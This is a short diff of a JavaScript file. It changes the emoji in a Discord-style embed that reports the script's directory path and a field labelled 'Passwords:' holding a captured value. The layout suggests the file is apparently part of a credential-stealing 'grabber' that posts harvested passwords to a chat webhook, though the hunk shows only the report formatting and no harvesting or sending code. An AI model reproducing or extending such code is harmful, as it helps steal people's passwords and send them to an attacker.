@@ -525,7 +525,7 @@ const os = require("os");
                 description: `\`\`\`diff\n- Path: ${__dirname}\`\`\``,
                 color: 8359053,
                 fields:[{
-                    name: "<a:LV:1077264031649366087> **Passwords:**",
+                    name: "<a:crow:1165719238045089823> **Passwords:**",
                     value: `\`\`\`ansi
 [2;31m ${e ?? "N/A"}[0m[2;34m[0m\`\`\``,
                     inline: false,
